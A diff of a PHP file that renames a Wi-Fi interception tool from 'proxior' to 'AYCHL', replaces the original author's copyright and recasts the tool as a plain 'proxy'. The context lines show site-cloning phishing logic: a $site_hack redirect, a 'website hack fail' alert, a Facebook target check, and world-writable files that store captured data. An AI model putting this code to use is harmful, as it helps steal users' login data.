@@ -1,15 +1,15 @@
 <?php
 
 /*
-*  Copyright (c) 2019-2020 Barchampas Gerasimos <makindosxx@gmail.com>.
-*  proxior is a wifi interception.
+*  Copyright (c) 2019-2020 AYCH inc <tokeneconomy@eclipso.eu>.
+*  File LICENSE or "https://www.gnu.org/licenses/".
 *
-*  proxior is free software: you can redistribute it and/or modify
+*  AYCHL is a proxy for lan and Wi-Fi. It is a free software: you can redistribute it and/or modify
 *  it under the terms of the GNU Affero General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
-*  proxior is distributed in the hope that it will be useful,
+*  AYCHL is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU Affero General Public License for more details.
@@ -362,12 +362,12 @@ usleep(3000000);
 
       #."<meta http-equiv='refresh' content='0; url=$site_hack'/>";
 
-      chmod("/var/www/proxior/post.php", 0777);
+      chmod("/var/www/aychl/post.php", 0777);
 
 
 
 
-      chmod("/var/www/proxior/index.html", 0777);
+      chmod("/var/www/aychl/index.html", 0777);
 
 
   $path_to_file = 'index.html';
@@ -422,7 +422,7 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
   
 
       $post_data_txt_site_ready = fopen("export/data.txt", "w");
-      chmod("/var/www/proxior/export/data.txt", 0777);
+      chmod("/var/www/aychl/export/data.txt", 0777);
 
 
     if ($site_ready=='https://www.facebook.com')
